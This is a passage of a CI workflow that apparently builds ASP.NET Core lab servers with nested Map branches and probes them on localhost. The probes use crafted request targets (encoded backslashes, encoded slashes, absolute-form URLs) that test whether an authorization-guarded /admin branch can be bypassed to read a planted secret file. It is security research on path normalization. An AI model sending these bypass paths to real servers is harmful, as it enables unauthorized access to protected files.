              Console.WriteLine($"TOP raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBase={ctx.Request.PathBase} path={ctx.Request.Path}");
              await next();
          });

          app.Map("/api", api =>
          {
              api.Use(async (ctx, next) =>
              {
                  Console.WriteLine($"API raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBase={ctx.Request.PathBase} path={ctx.Request.Path}");
                  await next();
              });

              api.Map("/admin", admin =>
              {
                  admin.Run(async ctx =>
                  {
                      Console.WriteLine($"PROTECTED_HIT raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBase={ctx.Request.PathBase} path={ctx.Request.Path}");
                      ctx.Response.StatusCode = StatusCodes.Status401Unauthorized;
                      await ctx.Response.WriteAsync($"PROTECTED pathBase={ctx.Request.PathBase} path={ctx.Request.Path}");
                  });
              });

              api.Run(async ctx =>
              {
                  Console.WriteLine($"API_PUBLIC_HIT raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBase={ctx.Request.PathBase} path={ctx.Request.Path}");
                  ctx.Response.StatusCode = StatusCodes.Status200OK;
                  await ctx.Response.WriteAsync($"API_PUBLIC pathBase={ctx.Request.PathBase} path={ctx.Request.Path}");
              });
          });

          app.Run(async ctx =>
          {
              Console.WriteLine($"ROOT_PUBLIC_HIT raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBase={ctx.Request.PathBase} path={ctx.Request.Path}");
              ctx.Response.StatusCode = StatusCodes.Status200OK;
              await ctx.Response.WriteAsync($"ROOT_PUBLIC pathBase={ctx.Request.PathBase} path={ctx.Request.Path}");
          });

          await app.RunAsync();
          EOF

          dotnet build /tmp/map-lab/MapLab.csproj -c Release

      - name: Exercise encoded-backslash nesting and absolute-form normalization
        shell: bash
        run: |
          set -euxo pipefail
          cd /tmp/map-lab
          dotnet run --no-build -c Release --project MapLab.csproj >server.log 2>&1 &
          echo $! >server.pid
          cleanup(){ kill "$(cat server.pid)" 2>/dev/null || true; }
          trap cleanup EXIT

          for i in {1..60}; do
            if curl -sS --max-time 1 http://127.0.0.1:5025/ready >/dev/null 2>&1; then break; fi
            sleep .2
          done

          cat >probe.py <<'PY'
          import json, socket

          cases = {
              "normal_admin": "/api/admin",
              "backslash_after_admin": "/api/admin%5Csecret",
              "backslash_between_nested_maps": "/api%5Cadmin",
              "backslash_between_nested_maps_with_tail": "/api%5Cadmin/secret",
              "literal_encoded_slash_between_maps": "/api%2Fadmin",
              "absolute_encoded_slash": "http://localhost:5025/api%2Fadmin",
              "absolute_backslash_dot_segment": r"http://localhost:5025/public\..\api\admin",
              "absolute_backslash_plain": r"http://localhost:5025/api\admin",
          }

          def send(target):
              s=socket.create_connection(("127.0.0.1",5025),timeout=3)
              s.settimeout(2)
              req=(
                  f"GET {target} HTTP/1.1\r\n"
                  "Host: localhost:5025\r\n"
                  "Connection: close\r\n"
                  "\r\n"
              ).encode("ascii")
              s.sendall(req)
              data=bytearray()
              while True:
                  try:
                      p=s.recv(65536)
                      if not p: break
                      data.extend(p)
                  except socket.timeout:
                      break
              s.close()
              raw=bytes(data)
              head,_,body=raw.partition(b"\r\n\r\n")
              status=head.split(b"\r\n",1)[0].decode("latin1","replace") if head else ""
              return {"status":status,"body":body.decode("latin1","replace"),"raw":raw[:1600].decode("latin1","replace")}

          results={}
          for name,target in cases.items():
              try:
                  results[name]={"target":target,**send(target)}
              except Exception as e:
                  results[name]={"target":target,"error":repr(e)}

          print(json.dumps(results,indent=2,sort_keys=True))
          open("results.json","w").write(json.dumps(results,indent=2,sort_keys=True))
          PY

          python3 probe.py | tee probe.out
          sleep .5
          echo "=== SERVER LOG ==="
          cat server.log

      - name: Upload nested Map results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: nested-map-backslash-${{ matrix.label }}
          path: |
            /tmp/map-lab/results.json
            /tmp/map-lab/probe.out
            /tmp/map-lab/server.log


  nested-map-staticfile-windows:
    runs-on: windows-latest
    timeout-minutes: 20
    name: nested-map-staticfile-windows-net11
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 11.0.100-rc.1.26425.128

      - name: Build Windows static-file authorization harness
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          New-Item -ItemType Directory -Force -Path D:\map-static-lab | Out-Null

          @'
          <Project Sdk="Microsoft.NET.Sdk.Web">
            <PropertyGroup>
              <TargetFramework>net11.0</TargetFramework>
              <ImplicitUsings>enable</ImplicitUsings>
              <Nullable>enable</Nullable>
            </PropertyGroup>
          </Project>
          '@ | Set-Content D:\map-static-lab\MapStaticLab.csproj

          @'
          using Microsoft.AspNetCore.Http.Features;
          using Microsoft.Extensions.FileProviders;

          var builder = WebApplication.CreateBuilder(args);
          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5035));
          var app = builder.Build();

          var contentRoot = Path.Combine(AppContext.BaseDirectory, "files");
          Directory.CreateDirectory(Path.Combine(contentRoot, "admin"));
          File.WriteAllText(Path.Combine(contentRoot, "admin", "secret.txt"), "TOP_SECRET_7B4F");

          app.Use(async (ctx, next) =>
          {
              Console.WriteLine($"TOP raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBaseValue={ctx.Request.PathBase.Value} pathValue={ctx.Request.Path.Value}");
              await next();
          });

          app.Map("/api", api =>
          {
              api.Use(async (ctx, next) =>
              {
                  Console.WriteLine($"API raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBaseValue={ctx.Request.PathBase.Value} pathValue={ctx.Request.Path.Value}");
                  await next();
              });

              api.Map("/admin", admin =>
              {
                  admin.Use(async (ctx, next) =>
                  {
                      Console.WriteLine($"AUTH_GUARD_HIT raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBaseValue={ctx.Request.PathBase.Value} pathValue={ctx.Request.Path.Value}");
                      if (ctx.Request.Headers["X-Admin-Key"] != "research-only")
                      {
                          ctx.Response.StatusCode = StatusCodes.Status401Unauthorized;
                          await ctx.Response.WriteAsync("AUTH_REQUIRED");
                          return;
                      }
                      await next();
                  });

                  admin.UseStaticFiles(new StaticFileOptions
                  {
                      FileProvider = new PhysicalFileProvider(contentRoot),
                      ServeUnknownFileTypes = false
                  });

                  admin.Run(async ctx =>
                  {
                      ctx.Response.StatusCode = 404;
                      await ctx.Response.WriteAsync("ADMIN_NOT_FOUND");
                  });
              });

              // General /api static files are intentionally available.
              // The nested /admin branch is expected to protect admin/secret.txt.
              api.UseStaticFiles(new StaticFileOptions
              {
                  FileProvider = new PhysicalFileProvider(contentRoot),
                  ServeUnknownFileTypes = false
              });

              api.Run(async ctx =>
              {
                  ctx.Response.StatusCode = 404;
                  await ctx.Response.WriteAsync("API_NOT_FOUND");
              });
          });

          app.Run(async ctx =>
          {
              ctx.Response.StatusCode = 404;
              await ctx.Response.WriteAsync("ROOT_NOT_FOUND");
          });

          await app.RunAsync();
          '@ | Set-Content D:\map-static-lab\Program.cs

          dotnet build D:\map-static-lab\MapStaticLab.csproj -c Release

      - name: Run Windows nested-Map static-file exploit controls
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          Set-Location D:\map-static-lab

          $proc = Start-Process dotnet -ArgumentList 'run --no-build -c Release --project MapStaticLab.csproj' -RedirectStandardOutput server.log -RedirectStandardError server.err -PassThru

          try {
            $ready = $false
            for ($i=0; $i -lt 60; $i++) {
              try {
                Invoke-WebRequest -Uri 'http://127.0.0.1:5035/ready' -SkipHttpErrorCheck -TimeoutSec 1 | Out-Null
                $ready = $true
                break
              } catch {
                Start-Sleep -Milliseconds 250
              }
            }
            if (-not $ready) { throw 'Server did not become ready' }

            function Invoke-Raw([string]$Target, [bool]$Auth) {
              $client = [System.Net.Sockets.TcpClient]::new('127.0.0.1',5035)
              try {
                $stream = $client.GetStream()
                $extra = if ($Auth) { "X-Admin-Key: research-only`r`n" } else { "" }
                $req = "GET $Target HTTP/1.1`r`nHost: localhost:5035`r`n" + $extra + "Connection: close`r`n`r`n"
                $bytes = [System.Text.Encoding]::ASCII.GetBytes($req)
                $stream.Write($bytes,0,$bytes.Length)
                $stream.Flush()
                $reader = [System.IO.StreamReader]::new($stream,[System.Text.Encoding]::Latin1)
                return $reader.ReadToEnd()
              } finally {
                $client.Dispose()
              }
            }

            $targets = [ordered]@{
              normal_no_auth = '/api/admin/secret.txt'
              normal_with_auth = '/api/admin/secret.txt'
              backslash_no_auth = '/api%5Cadmin%5Csecret.txt'
              backslash_with_tail_no_auth = '/api%5Cadmin/secret.txt'
              backslash_after_admin_no_auth = '/api/admin%5Csecret.txt'
            }

            $results = [ordered]@{}
            foreach ($name in $targets.Keys) {
              $auth = $name -eq 'normal_with_auth'
              $raw = Invoke-Raw $targets[$name] $auth
              $status = ($raw -split "`r`n")[0]
              $results[$name] = [ordered]@{
                target = $targets[$name]
                status = $status
                contains_secret = $raw.Contains('TOP_SECRET_7B4F')
                contains_auth_required = $raw.Contains('AUTH_REQUIRED')
                raw = $raw
              }
            }

            $results | ConvertTo-Json -Depth 5 | Set-Content results.json
            Get-Content results.json
            Write-Host '=== SERVER LOG ==='
            Get-Content server.log
            Write-Host '=== SERVER ERR ==='
            Get-Content server.err
          }
          finally {
            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
          }

      - name: Upload Windows static-file results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: nested-map-staticfile-windows-net11
          path: |
            D:\map-static-lab\results.json
            D:\map-static-lab\server.log
            D:\map-static-lab\server.err
